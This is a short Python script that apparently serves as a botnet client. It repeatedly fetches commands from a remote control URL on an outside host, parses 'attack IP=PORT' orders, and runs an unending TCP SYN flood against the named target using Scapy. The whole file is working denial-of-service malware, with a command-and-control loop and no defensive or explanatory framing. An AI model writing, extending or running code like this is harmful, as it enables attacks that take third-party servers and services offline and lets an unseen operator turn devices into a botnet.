import requests
import re
from scapy.all import *

# Define variables
url = "http://chathere.getenjoyment.net/apk_payload/index2.php"

def extract_ip_port(command):
    pattern = r"attack (\d+\.\d+\.\d+\.\d+)=(\d+)"
    match = re.match(pattern, command)
    if match:
        ip = match.group(1)
        port = int(match.group(2))
        return ip, port
    else:
        return None, None

def syn_flood(ip, port):
    print(f"Starting TCP SYN flood on {ip}:{port}")
    total_packets = 0
    successful_attempts = 0
    failed_attempts = 0
    
    while True:
        try:
            # Create a SYN packet using Scapy
            packet = IP(dst=ip) / TCP(dport=port, flags="S")
            
            # Send the packet
            send(packet, verbose=0)
            
            successful_attempts += 1
        except Exception as e:
            failed_attempts += 1
        
        total_packets += 1
        print(f"Sent {total_packets} packets: Success={successful_attempts}, Failures={failed_attempts}")

def listen_for_commands():
    while True:
        response = requests.get(url)
        
        if response.status_code == 200:
            command = response.text.strip()
            
            if command.startswith("attack"):
                ip, port = extract_ip_port(command)
                
                if ip and port:
                    syn_flood(ip, port)
                else:
                    print(f"Invalid command format: {command}")
            else:
                print(f"Unknown command: {command}")
        else:
            print("Failed to fetch command from URL.")
        
        # Wait for 5 seconds before checking again
        time.sleep(5)

if __name__ == "__main__":
    listen_for_commands()
